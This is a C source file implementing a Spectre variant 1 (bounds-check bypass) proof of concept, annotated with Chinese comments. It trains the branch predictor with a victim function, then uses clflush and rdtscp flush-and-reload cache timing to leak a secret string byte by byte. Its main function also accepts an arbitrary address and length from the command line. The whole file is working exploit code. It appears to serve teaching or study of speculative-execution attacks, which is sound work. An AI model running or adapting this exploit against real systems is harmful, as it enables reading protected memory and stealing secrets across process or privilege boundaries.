#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
/*SIMD拓展指令集的内置函数 intrinsic functions*/

#pragma optimize("gt", on)
/*开启全局优化技术，能够实现跨函数边界的优化*/
/*最小、最快整数 表示至少具有指定位数的数*/

#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif
/*sscanf函数，根据字符串str中的数据类型赋值给相应数据*/

/********************************************************************
受害者代码
********************************************************************/
unsigned int array1_size = 16;

uint8_t unused1[64];//在array1前后各定义64字节未使用内存空间

//uint8_t 定义array1的每个元素1字节，memory中一个地址空间存储 1 byte，即8 bits数据，对应一个ASCII值
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};

uint8_t unused2[64];//在array1前后各定义64字节未使用内存空间

//ubuntu下可以使用getconf -a 命令查看详细的cache line size 64B
//cache line = 64 Bytes = 512 bits

uint8_t flush_reload_buffer[256 * 512];//256个cache line

//秘密信息：target
char* secret = "NingXiaUniversity@sgy";

//将temp变量定义在函数外面,使编译器不会优化victom_function()
uint8_t temp = 0;

//受害者函数
void victim_function(size_t x)
{
	if (x < array1_size)
	{
		//这里flush_reload_buffer的值也不重要，只要操作将flush_reload_buffer[array1[x]*512]写入cache即可。
		temp &= flush_reload_buffer[array1[x] * 512];
	}
}


/********************************************************************
分析代码
********************************************************************/

//设置cache hit的周期阈值
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */



//最优guess：value[0]，次优guess：value[1]
void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int score[2])
{
	static int results[256];

	int tries, i, j, k, mix_i;

	unsigned int junk = 0;

	//size_t training_x, x;
	unsigned long training_x, x;

	register unsigned long time1, time2;

	volatile unsigned char* addr;//volatile关键字提醒编译器不要优化该变量，而是直接从内存地址读取数据

	for (i = 0; i < 256; i++)
        results[i] = 0;

	for (tries = 999; tries > 0; tries--)
	{
		//将256个cache line中的数据都清空
		for (i = 0; i < 256; i++)
			_mm_clflush(&flush_reload_buffer[i * 512]);

		//30次循环：每训练5次(x=training_x)，攻击1次(x=malicious_x)。
		//array1_size=16
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{  
			_mm_clflush(&array1_size);//将array_size从cache中擦除

			for (volatile int z = 0; z < 100; z++)
			{
				/* Delay (can also mfence) */
			} 
			asm volatile("mfence\n");//这一部分是必须的
			
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			//j x x x对应输出：29 0 0 training_x,28 0 0 training_x,...,24 -65536 -1 malicious_x,...

			//这部分逻辑就是控制5次training_x，1次malicious_x
			x = ((j % 6) - 1) & ~0xFFFF; 
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			/*调用受害者函数*/
			victim_function(x);
		}//for


		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			/* 
			乘以 167 是为了打乱 i 的顺序，使得生成的随机数更加均匀分布。
			如果直接用 i 来取模，那么生成的随机数就会按照 i 的增长而循环，没有随机性。
			167 是一个素数，它和 256 互质，所以乘以 167 后取模 256，
			可以得到 0 ~ 255 中的所有可能值。
			当然，也可以用其他的素数来代替 167，只要它们和 256 互质即可。
			*/
			mix_i = ((i * 167) + 13) & 255;//255与，只留低8bit

			addr = &flush_reload_buffer[mix_i * 512];

			//开始计时
			time1 = __rdtscp(&junk); /* READ TIMER */
			
			junk = *addr;

			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

			//若访问时间小于cache hit阈值，array1[malicious_x]=mix_i的分数+1
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				++results[mix_i]; /* cache hit - add +1 to score for this value */
		}

		//最优/次优结果：j/k
		j = k = -1;
		
		//每一轮都对result[255]进行一次
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				//将最大值赋给j，次大值赋给k
				k = j;j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		//判断是否需要提前终止比较，可以删除
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}


int main(int argc, const char** argv)
{
	printf("main process:\n");
	printf("将secret数组 【%s】 放置在内存中，其存放地址:【%p】\n", secret, (void *)(secret));
	//获取偏移量，也就是预测执行将要读取的地方
	size_t malicious_x = (size_t)(secret - (char *)array1); 

	//最优guess[0]对应的分数：score[0]
	int score[2], len = strlen(secret);
	//最优guess：value[0]，次优guess：value[1]
	uint8_t value[2];

	for (size_t i = 0; i < sizeof(flush_reload_buffer); i++)
		flush_reload_buffer[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	//若给主程序三个参数
	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */

		sscanf_s(argv[2], "%d", &len);
		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
	}//if argc==3

	printf("共读取 %d 字节:\n", len);
	while (--len >= 0)
	{
		printf("读取恶意偏移量(-malicious_x-) 【%p】 ", (void *)malicious_x);
		//依次对所有字节发起攻击
		readMemoryByte(malicious_x++, value, score);

		printf("%s: ", (score[0] >=  score[1] ? "成功" : "不明"));
		//printf("%s: ", (score[0] >=  2* score[1] ? "成功" : "不明"));
		printf("0x%02X='%c' score=%d ", value[0], value[0], score[0] );

		if (score[1] > 0)
			printf("(second: 0x%02X='%c' second_score=%d)\n",value[1],value[1],score[1]);
	}

#ifdef _MSC_VER
	printf("Press ENTER to exit\n");
	getchar();	/* Pause Windows console */
#endif
	return (0);
}